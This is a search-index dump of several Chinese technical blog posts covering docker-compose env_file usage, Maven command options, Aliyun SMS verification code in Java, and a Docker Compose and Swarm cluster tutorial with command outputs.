always networks: - \"dockercompose_sc-net\" # networks: # - sc-net ports: - 5002:9011 volumes: - \"/home/hubu/dockerfiles/comp:/data\" deploy: resources: limits: cpus: '0.50' memory: 1G command: [\"java\", \"-jar\", \"/data/comp.jar\"] env_file: .env 运行加参数： docker-compose --compatibility up -d ","date":"2021-04-11","objectID":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/:2:6","tags":["cpmpose-env_file"],"title":"Docker Compose之env_file应用","uri":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/"},{"categories":["Java后端"],"content":"抽了点时间，整理了一些 maven 常用命令参数，以便参考； ","date":"2021-04-11","objectID":"/posts/maven%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:0:0","tags":["maven"],"title":"maven常用命令","uri":"/posts/maven%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Java后端"],"content":"mvn 命令参数 mvn -v, –version 显示版本信息; mvn -V, –show-version 显示版本信息后继续执行 Maven 其他目标; mvn -h, –help 显示帮助信息; mvn -e, –errors 控制 Maven 的日志级别, 产生执行错误相关消息; mvn -X, –debug 控制 Maven 的日志级别, 产生执行调试信息; mvn -q, –quiet 控制 Maven 的日志级别, 仅仅显示错误; mvn -Pxxx 激活 id 为 xxx 的 profile (如有多个，用逗号隔开); mvn -Dxxx=yyy 指定 java 全局属性; mvn -o , –offline 运行 offline 模式, 不联网更新依赖; mvn -N, –non-recursive 仅在当前项目模块执行命令, 不构建子模块; mvn -pl, –module_name 在指定模块上执行命令; mvn -ff, –fail-fast 遇到构建失败就直接退出; mvn -fn, –fail-never 无论项目结果如何, 构建从不失败; mvn -fae, –fail-at-end 仅影响构建结果, 允许不受影响的构建继续; mvn -C, –strict-checksums 如果校验码不匹配的话, 构建失败; mvn -c, –lax-checksums 如果校验码不匹配的话, 产生告警; mvn -U 强制更新 snapshot 类型的插件或依赖库 (否则 maven 一天只会更新一次 snapshot 依赖); mvn -npu, –no-plugin-updates 对任何相关的注册插件, 不进行最新检查 (使用该选项使 Maven 表现出稳定行为，该稳定行为基于本地仓库当前可用的所有插件版本); mvn -cpu, –check-plugin-updates 对任何相关的注册插件, 强制进行最新检查 (即使项目 POM 里明确规定了 Maven 插件版本, 还是会强制更新); mvn -up, –update-plugins [mvn -cpu] 的同义词; mvn -B, –batch-mode 在非交互（批处理）模式下运行 (该模式下, 当 Mven 需要输入时, 它不会停下来接受用户的输入, 而是使用合理的默认值); mvn -f, –file 强制使用备用的 POM 文件; mvn -s, –settings 用户配置文件的备用路径; mvn -gs, –global-settings 全局配置文件的备用路径; mvn -emp, –encrypt-master-password 加密主安全密码, 存储到 Maven settings 文件里; mvn -ep, –encrypt-password 加密服务器密码, 存储到 Maven settings 文件里; mvn -npr, –no-plugin-registry 对插件版本不使用~/.m2/plugin-registry.xml(插件注册表) 里的配置; ","date":"2021-04-11","objectID":"/posts/maven%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:0:1","tags":["maven"],"title":"maven常用命令","uri":"/posts/maven%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Java后端"],"content":"mvn 常用命令 创建 Maven 的普通 java 项目： mvn archetype:create -DgroupId=packageName -DartifactId=projectName 创建 Maven 的 Web 项目： mvn archetype:create -DgroupId=packageName -DartifactId=webappName -DarchetypeArtifactId=maven-archetype-webapp 编译源代码：mvn compile 编译测试代码：mvn test-compile 运行测试：mvn test 产生 site：mvn site 打包：mvn package 在本地 Repository 中安装 jar：mvn install 清除产生的项目：mvn clean 生成 eclipse 项目：mvn eclipse:eclipse 生成 idea 项目：mvn idea:idea 组合使用 goal 命令，如只打包不测试：mvn -Dtest package 编译测试的内容：mvn test-compile 只打 jar 包: mvn jar:jar 只测试而不编译，也不测试编译：mvn test -skipping compile -skipping test-compile (-skipping 的灵活运用，当然也可以用于其他组合命令) 清除 eclipse 的一些系统设置: mvn eclipse:clean ps 一般使用情况是这样，首先通过 cvs 或 svn 下载代码到本机，然后执行 mvn eclipse:eclipse 生成 ecllipse 项目文件，然后导入到 eclipse 就行了；修改代码后执行 mvn compile 或 mvn test 检验，也可以下载 eclipse 的 maven 插件。 mvn -version/-v 显示版本信息 mvn archetype:generate 创建 mvn 项目 mvn archetype:create -DgroupId=com.oreilly -DartifactId=my-app 创建 mvn 项目 mvn package 生成 target 目录，编译、测试代码，生成测试报告，生成 jar/war 文件 mvn jetty:run 运行项目于 jetty 上, mvn compile 编译 mvn test 编译并测试 mvn clean 清空生成的文件 mvn site 生成项目相关信息的网站 mvn -Dwtpversion=1.0 eclipse:eclipse 生成 Wtp 插件的 Web 项目 mvn -Dwtpversion=1.0 eclipse:clean 清除 Eclipse 项目的配置信息 (Web 项目) mvn eclipse:eclipse 将项目转化为 Eclipse 项目 在应用程序用使用多个存储库 \u003crepositories\u003e \u003crepository\u003e \u003cid\u003eIbiblio\u003c/id\u003e \u003cname\u003eIbiblio\u003c/name\u003e \u003curl\u003ehttp://www.ibiblio.org/maven/\u003c/url\u003e \u003c/repository\u003e \u003crepository\u003e \u003cid\u003ePlanetMirror\u003c/id\u003e \u003cname\u003ePlanet Mirror\u003c/name\u003e \u003curl\u003ehttp://public.planetmirror.com/pub/maven/\u003c/url\u003e \u003c/repository\u003e \u003c/repositories\u003e 命令： mvn deploy:deploy-file -DgroupId=com -DartifactId=client -Dversion=0.1.0-Dpackaging=jar -Dfile=d:\\client-0.1.0.jar-DrepositoryId=maven-repository-inner -Durl=ftp://xxxxxxx/opt/maven/repository/ 发布第三方 Jar 到本地库中： mvn install:install-file -DgroupId=com -DartifactId=client -Dversion=0.1.0-Dpackaging=jar -Dfile=d:\\client-0.1.0.jar -DdownloadSources=true -DdownloadJavadocs=true mvn -e 显示详细错误 信息. mvn validate 验证工程是否正确，所有需要的资源是否可用。 mvn test-compile 编译项目测试代码。 mvn integration-","date":"2021-04-11","objectID":"/posts/maven%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:0:2","tags":["maven"],"title":"maven常用命令","uri":"/posts/maven%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Java后端"],"content":"mvn 常用命令 2 mvn -v 显示版本 mvn help:describe -Dplugin=help 使用 help 插件的 describe 目标来输出 Maven Help 插件的信息。 mvn help:describe -Dplugin=help -Dfull 使用 Help 插件输出完整的带有参数的目标列 mvn help:describe -Dplugin=compiler -Dmojo=compile -Dfull 获取单个目标的信息, 设置 mojo 参数和 plugin 参数。此命令列出了 Compiler 插件的 compile 目标的所有信息 mvn help:describe -Dplugin=exec -Dfull 列出所有 Maven Exec 插件可用的目标 mvn help:effective-pom 看这个 “有效的 (effective)”POM，它暴露了 Maven 的默认设置 mvn archetype:create -DgroupId=org.sonatype.mavenbook.ch03 -DartifactId=simple -DpackageName=org.sonatype.mavenbook 创建 Maven 的普通 java 项目，在命令行使用 Maven Archetype 插件 mvn exec:java -Dexec.mainClass=org.sonatype.mavenbook.weather.Main Exec 插件让我们能够在不往 classpath 载入适当的依赖的情况下，运行这个程序 mvn dependency:resolve 打印出已解决依赖的列表 mvn dependency:tree 打印整个依赖树 mvn install -X 想要查看完整的依赖踪迹，包含那些因为冲突或者其它原因而被拒绝引入的构件，打开 Maven 的调试标记运行 mvn install -Dmaven.test.skip=true 给任何目标添加 maven.test.skip 属性就能跳过测试 mvn install assembly:assembly 构建装配 Maven Assembly 插件是一个用来创建你应用程序特有分发包的插件 mvn jetty:run 调用 Jetty 插件的 Run 目标在 Jetty Servlet 容器中启动 web 应用 mvn compile 编译你的项目 mvn clean install 删除再编译 mvn hibernate3:hbm2ddl 使用 Hibernate3 插件构造数据库 ","date":"2021-04-11","objectID":"/posts/maven%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:0:3","tags":["maven"],"title":"maven常用命令","uri":"/posts/maven%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Java后端"],"content":"短信验证服务编写","date":"2021-04-10","objectID":"/posts/%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0/","tags":["短信验证码"],"title":"短信验证码实现","uri":"/posts/%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0/"},{"categories":["Java后端"],"content":"阿里云短信服务 1、添加用户组和相关权限 2、创建一个用户、获取相应的Acessce Key 要将这个账户保存下来，只显示一次，如果被泄露马上禁用生成新的，后面需要用到 开通阿里云短信服务 帮助指南 1、开通短信服务，找到短信控制台面板 2、添加短信模板、添加签名（中括号里面的名称） 编写代码测试 在pom文件中添加如下依赖 \u003cdependency\u003e \u003cgroupId\u003ecom.aliyun\u003c/groupId\u003e \u003cartifactId\u003ealiyun-java-sdk-core\u003c/artifactId\u003e \u003cversion\u003e4.5.16\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.alibaba\u003c/groupId\u003e \u003cartifactId\u003efastjson\u003c/artifactId\u003e \u003cversion\u003e1.2.62\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-data-redis\u003c/artifactId\u003e \u003c/dependency\u003e 2、编写服务与服务实现： package com.example.democompose.Service.Impl; import com.alibaba.fastjson.JSONObject; import com.aliyuncs.CommonRequest; import com.aliyuncs.CommonResponse; import com.aliyuncs.DefaultAcsClient; import com.aliyuncs.IAcsClient; import com.aliyuncs.exceptions.ClientException; import com.aliyuncs.exceptions.ServerException; import com.aliyuncs.http.MethodType; import com.aliyuncs.profile.DefaultProfile; import com.example.democompose.Service.SendSms; import org.springframework.stereotype.Service; import java.util.HashMap; import java.util.Map; @Service public class SendSmsImpl implements SendSms { @Override public boolean send(String phoneNum, String templateCode, Map\u003cString, Object\u003e map) { DefaultProfile profile = DefaultProfile.getProfile(\"cn-qingdao\", \"accessKeyIdxxxxxx\", \"accessKeySecretxxxxxxx\"); IAcsClient client = new DefaultAcsClient(profile); CommonRequest request = new CommonRequest(); request.setSysMethod(MethodType.POST); request.setSysDomain(\"dysmsapi.aliyuncs.com\"); request.setSysVersion(\"2017-05-25\"); request.setSysAction(\"SendSms\"); request.putQueryParameter(\"PhoneNumbers\", phoneNum); request.putQueryParameter(\"SignName\", \"东猿叔\"); request.putQueryParameter(\"TemplateCode\", templateCode); request.putQueryParameter(\"TemplateParam\", JSONObject.toJSONString(map)); try { CommonResponse response = client.getCommonResponse(request); System.out.println(response.getData()); return response.getHttpResponse().isSuccess(); } c","date":"2021-04-10","objectID":"/posts/%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0/:0:0","tags":["短信验证码"],"title":"短信验证码实现","uri":"/posts/%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%9E%E7%8E%B0/"},{"categories":["运维"],"content":"Docker compose  \u0026  Docker Swarm","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"Docker Compose Using Compose is basically a three-step process: Define your app’s environment with a Dockerfile so it can be reproduced anywhere. Define the services that make up your app in docker-compose.yml so they can be run together in an isolated environment. Run docker compose up and the Docker compose command starts and runs your entire app. You can alternatively run docker-compose up using the docker-compose binary. Compose是官方的开源项目，需要安装， ​ Dockerfile可以让程序在任何地方运行，但是现在有一个web服务，但是它又需要redis、MySQL、nginx等多个容器，一个一个启动就会十分麻烦。 Compose例子： version: \"3.9\" # optional since v1.27.0 services: web: build: . ports: - \"5000:5000\" volumes: - .:/code - logvolume01:/var/log links: - redis redis: image: redis volumes: logvolume01: {} ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:0:0","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"安装Compose 1、下载： sudo curl -L \"https://github.com/docker/compose/releases/download/1.29.0/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo curl -L \"https://get.daocloud.io/docker/compose/releases/download/1.29.0/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose 2、授权 sudo chmod +x /usr/local/bin/docker-compose 3、全局使用 [root@node4 /]# docker-compose version docker-compose version 1.29.0, build 07737305 docker-py version: 5.0.0 CPython version: 3.7.10 OpenSSL version: OpenSSL 1.1.0l 10 Sep 2019 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:1:0","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"快速体验 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:2:0","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"Step 1: 创建应用 Define the application dependencies. Create a directory for the project(创建目录): $ mkdir composetest $ cd composetest Create a file called app.py in your project directory and paste this in（创建python文件）: import time import redis from flask import Flask app = Flask(__name__) cache = redis.Redis(host='redis', port=6379) def get_hit_count(): retries = 5 while True: try: return cache.incr('hits') except redis.exceptions.ConnectionError as exc: if retries == 0: raise exc retries -= 1 time.sleep(0.5) @app.route('/') def hello(): count = get_hit_count() return 'Hello World! I have been seen {} times.\\n'.format(count) 在这个例子中, redis 是应用网络中redis的容器名称. 使用端口, 6379. 注意get_hit_coun函数的编写方式。这个基本的重试循环允许我们在redis服务不可用时多次尝试请求。当应用程序上线时，这在启动时很有用，但如果在应用程序的生命周期内需要随时重新启动Redis服务，也会使我们的应用程序更有弹性。在集群中，这也有助于处理节点之间的瞬时连接中断。 创建 requirements.txt 文件: flask redis ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:2:1","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"Step 2: 编写Dockerfile 这一步将编写dockerfile并build image ,这个镜像包含了python所需要的环境 Dockerfile 文件: FROM python:3.7-alpine WORKDIR /code ENV FLASK_APP=app.py ENV FLASK_RUN_HOST=0.0.0.0 RUN apk add --no-cache gcc musl-dev linux-headers COPY requirements.txt requirements.txt RUN pip install -r requirements.txt EXPOSE 5000 COPY . . CMD [\"flask\", \"run\"] This tells Docker to: Build an image starting with the Python 3.7 image. Set the working directory to /code. Set environment variables used by the flask command. Install gcc and other dependencies Copy requirements.txt and install the Python dependencies. Add metadata to the image to describe that the container is listening on port 5000 Copy the current directory . in the project to the workdir . in the image. Set the default command for the container to flask run. For more information on how to write Dockerfiles, see the Docker user guide and the Dockerfile reference. ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:2:2","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"Step 3: 在Compose文件中定义Service 创建 docker-compose.yml 文件: version: \"3.9\" services: web: build: . ports: - \"5000:5000\" redis: image: \"redis:alpine\" 这个Compose声明了两个service: web and redis. [root@node4 composetest]# ll 总用量 16 -rw-r--r--. 1 root root 514 4月 9 16:48 app.py -rw-r--r--. 1 root root 111 4月 9 17:00 docker-compose.yml -rw-r--r--. 1 root root 252 4月 9 16:50 Dockerfile -rw-r--r--. 1 root root 12 4月 9 16:49 requirements.txt ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:2:3","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"Step 4: 用Compose启动多个容器 docker-compose up [root@node4 ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 9a28f238ee73 composetest_web \"flask run\" 34 seconds ago Up 32 seconds 0.0.0.0:5000-\u003e5000/tcp composetest_web_1 e4cb9836d38d redis:alpine \"docker-entrypoint.s…\" 34 seconds ago Up 32 seconds 6379/tcp composetest_redis_1 [root@node4 ~]# curl localhost:5000 Hello World! I have been seen 1 times. [root@node4 ~]# curl localhost:5000 Hello World! I have been seen 2 times. [root@node4 ~]# curl localhost:5000 Hello World! I have been seen 3 times. [root@node4 ~]# curl localhost:5000 Hello World! I have been seen 4 times. [root@node4 ~]# curl localhost:5000 Hello World! I have been seen 5 times. [root@node4 ~]# docker network inspect composetest_default [ { \"Name\": \"composetest_default\", \"Id\": \"25ec9a55f82b6ff2c9b190c911cf6a89ce998759b912c3f2dbf5c2849a6c89d5\", \"Created\": \"2021-04-09T17:01:45.524551071+08:00\", \"Scope\": \"local\", \"Driver\": \"bridge\", \"EnableIPv6\": false, \"IPAM\": { \"Driver\": \"default\", \"Options\": null, \"Config\": [ { \"Subnet\": \"172.18.0.0/16\", \"Gateway\": \"172.18.0.1\" } ] }, \"Internal\": false, \"Attachable\": true, \"Ingress\": false, \"ConfigFrom\": { \"Network\": \"\" }, \"ConfigOnly\": false, \"Containers\": { \"9a28f238ee7334688d70f20a2838cbcea964bb3f1282b99b4c787b61370bd202\": { \"Name\": \"composetest_web_1\", \"EndpointID\": \"920c033116c19419b0e2807f75284d768436cb272735642b7e8257f9564d9e45\", \"MacAddress\": \"02:42:ac:12:00:03\", \"IPv4Address\": \"172.18.0.3/16\", \"IPv6Address\": \"\" }, \"e4cb9836d38deb2d2dbd4211106dd2364ace9f97ab5e8827736fc7d39b5ba166\": { \"Name\": \"composetest_redis_1\", \"EndpointID\": \"7f359906cf87650c9ef25939d25c7cfe070ac1135855ff888f1b7a881682aa31\", \"MacAddress\": \"02:42:ac:12:00:02\", \"IPv4Address\": \"172.18.0.2/16\", \"IPv6Address\": \"\" } }, \"Options\": {}, \"Labels\": { \"com.docker.compose.network\": \"default\", \"com.docker.compose.project\": \"composetest\", \"com.docker.compose.version\": \"1.29.0\" } } ] 流程： 创建网络 执行docker-compose.yml 启动服务 默认规则： 默认服务名（容器名）：文件夹名_服务名__","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:2:4","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"yml文件编写规则 compose文件编写参考：https://docs.docker.com/compose/compose-file/compose-file-v3/ #第一层 version: '' #向下兼容 #第二层 service: #服务 服务1: #服务配置 images: build: network: ... 服务2: ... #第三层 volumes: network: config: ... 多看官方文档，开源项目的compose ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:3:0","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"部署Woedpress项目 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:4:0","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"1、创建目录： mkdir my_wordpress cd my_wordpress/ ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:4:1","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"2、创建compose文件： nano docker-compose.yml version: \"3.9\" services: db: image: mysql:5.7 volumes: - db_data:/var/lib/mysql restart: always environment: MYSQL_ROOT_PASSWORD: somewordpress MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress wordpress: depends_on: - db image: wordpress:latest ports: - \"8000:80\" restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: db_data: {} ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:4:2","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"3、启动： docker-compose up -d #后台启动 [root@node4 my_wordpress]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a56f5f6a9eb6 wordpress:latest \"docker-entrypoint.s…\" About a minute ago Up About a minute 0.0.0.0:8000-\u003e80/tcp my_wordpress_wordpress_1 63f261196b58 mysql:5.7 \"docker-entrypoint.s…\" About a minute ago Up About a minute 3306/tcp, 33060/tcp my_wordpress_db_1 All are easy!!!! ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:4:3","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"实战：自己编写服务上线 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:5:0","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"1、编写自己的服务： package com.example.democompose.Controller; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.data.redis.core.StringRedisTemplate; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class HelloController { @Autowired StringRedisTemplate redisTemplate; @GetMapping(\"/hello\") public String hello(){ Long views=redisTemplate.opsForValue().increment(\"views\"); return \"hello,这是第\"+views+\"次访问\"; } } server.port=8080 spring.redis.host=redis ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:5:1","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"2、编写Dockerfile文件： FROM java:8 COPY *.jar /app.jar CMD [\"--server.port=8080\"] EXPOSE 8888 ENTRYPOINT [\"java\",\"-jar\",\"/app.jar\"] ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:5:2","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"3、编写docker-compose.yml文件 version: '3.8' services: myapp: build: . image: mytextappcompose depends_on: - redis ports: - \"8080:8080\" redis: image: \"library/redis:alpine\" ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:5:3","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"4、打jar包上传服务器 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:5:4","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"5、运行服务： docker-compose up -d docker-compose up --build #重新构建 Docker Swarm ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:5:5","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"搭建集群 集群—–4台服务器（一主三从） 4台机器安装Docker(Xshell窗口右键：发送键输入到所有会话): sudo yum install -y yum-utils # 3、设置镜像仓 sudo yum-config-manager \\ --add-repo \\ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # 默认是国外的 可换国内 yum makecache fast # 4、安装相关的额 sudo yum install docker-ce docker-ce-cli containerd.io # 5、启动 sudo systemctl start docker docker version noe2 192.168.80.133 noe3 192.168.80.134 node4 192.168.80.135 test 192.168.80.136 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:6:0","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"初始化管理节点node2: # 初始化一个manager节点 docker swarm init --advertise-addr 192.168.80.133 [root@node2 network-scripts]# docker swarm init --advertise-addr 192.168.80.133 Swarm initialized: current node (a5gz7qpsgbjolzgzg1tlaj8lh) is now a manager. To add a worker to this swarm, run the following command: docker swarm join --token SWMTKN-1-4ga8o43bv28liq5q27e27deq5513t3efpl1nq7mlskyp3dulgn-e252fso8bl6zbrqtywqusrexd 192.168.80.133:2377 To add a manager to this swarm, run 'docker swarm join-token manager' and follow the instructions. docker swarm join加入一个节点： #获取令牌 docker swarm join-token manager #管理节点 docker swarm join-token worker #工作节点 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:6:1","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"初始化工作节点node3: [root@node3 ~]# docker swarm join --token SWMTKN-1-4ga8o43bv28liq5q27e27deq5513t3efpl1nq7mlskyp3dulgn-e252fso8bl6zbrqtywqusrexd 192.168.80.133:2377 This node joined a swarm as a worker. 查看现有集群状态： [root@node2 /]# docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION a5gz7qpsgbjolzgzg1tlaj8lh * node2 Ready Active Leader 20.10.5 e2hlgfd1v4xk7azjp27ce3fcy node3 Ready Active 20.10.5 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:6:2","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"初始化工作节点node4: [root@node2 /]# docker swarm join-token worker To add a worker to this swarm, run the following command: docker swarm join --token SWMTKN-1-4ga8o43bv28liq5q27e27deq5513t3efpl1nq7mlskyp3dulgn-e252fso8bl6zbrqtywqusrexd 192.168.80.133:2377 [root@node2 /]# docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION a5gz7qpsgbjolzgzg1tlaj8lh * node2 Ready Active Leader 20.10.5 e2hlgfd1v4xk7azjp27ce3fcy node3 Ready Active 20.10.5 6ne9u5knznm8ei0c5uz7znka9 node4 Ready Active 20.10.5 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:6:3","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"初始化管理节点test: docker swarm join-token manager docker node ls [root@localhost ~]# docker swarm join --token SWMTKN-1-4ga8o43bv28liq5q27e27deq5513t3efpl1nq7mlskyp3dulgn-66whvjsogw3qsqozb79oprffr 192.168.80.133:2377 Error response from daemon: manager stopped: can't initialize raft node: rpc error: code = Unknown desc = could not connect to prospective new cluster member using its advertised address: rpc error: code = Unavailable desc = connection error: desc = \"transport: Error while dialing dial tcp 192.168.80.136:2377: connect: no route to host\" 试了好多次发现总是加入管理节点错误，一开始怀疑自己网络通信问题，后来网上无脑抄袭一致认为代理问题： 最终发现是自己新建的虚拟机test防火墙没有关: #查看防火墙状态 systemctl status firewalld.service #停止防火墙 systemctl stop firewalld.service #永久停止 systemctl disable firewalld.service ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:6:4","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"Raft协议 现在：双主双从，假设一个节点挂了，其他节点是否可用？？ Raft协议：保证大多数节点存活集群才可用，至少大于1台，集群至少大于3台！！ 实验： 1、将node2管理节点停止，宕机，另外一个管理节点也不能用了 systemctl stop docker 在test管理节点查看集群，发现不可用： 2、重新启动node2: systemctl start docker 发现leader节点变了： 3、工作节点node3离开： docker swarm --help docker swarm leave 4、三主一工作： docker swarm join-token manager jb30cv8ej8xjokjc1cu5l8kjo localhost.localdomain Ready Active Leader 20.10.5 a5gz7qpsgbjolzgzg1tlaj8lh * node2 Ready Active Reachable 20.10.5 nmhr2t2b5cgy4l64bcwl0mxjt node3 Ready Active Reachable 20.10.5 e2hlgfd1v4xk7azjp27ce3fcy node3 Down Active 20.10.5 6ne9u5knznm8ei0c5uz7znka9 node4 Ready Active 20.10.5 现在就是3台作为管理节点： 5、停掉Leader(test)： 现在Leader是test节点，停掉： 在node2查看集群状态,发现node3变成了leader，集群任然可用 6、大多数存活可用 现在只有两个管理节点（node2/node3），一个工作节点(node4)，如果再停止一个管理节点，那就无法使用了： [root@node3 ~]# docker node ls Error response from daemon: rpc error: code = Unknown desc = The swarm does not have a leader. It's possible that too few managers are online. Make sure more than half of the managers are online. 大多数管理节点存活才可用 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:7:0","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"集群部署应用、弹性、扩缩容 以后告别docker run 集群：高可用，web-\u003eredis(分布在三台不同主机上，服务副本，挂了一个没事，其他可用) 容器=》服务=》副本 docker run # 容器启动，不具备扩缩容功能 docker service #服务，具备扩缩容、滚动跟新、灰度发布 ","date":"2021-04-09","objectID":"/posts/docker%E8%BF%9B%E9%98%B6/:8:0","tags":["docker进阶"],"title":"Docker进阶","uri":"/posts/docker%E8%BF%9B%E9%98%B6/"},{"categories":["运维"],"content":"服务部署 #前提是swarm搭建好 #在node2中创建服务 docker service create -p 8888:80 --name mynginx nginx docker service ls docker service ps mynginx docker service inspect mynginx [root@node2 ~]# docker service ps mynginx ID NAME IMAGE NODE DESIRED STATE CURRENT STATE ERROR PORTS ndtmy83nj0v3 mynginx.1 nginx:latest node3 Running Running 34 seconds ago [root@node2 ~]# docker service ls ID NAME MODE REPLICAS IMAGE PORTS iv9jcn74r0uj mynginx replicated 1/1 nginx:latest *:8888-\u003e80/tcp # 服务副本只有一个，并且服务运行在node3主机上 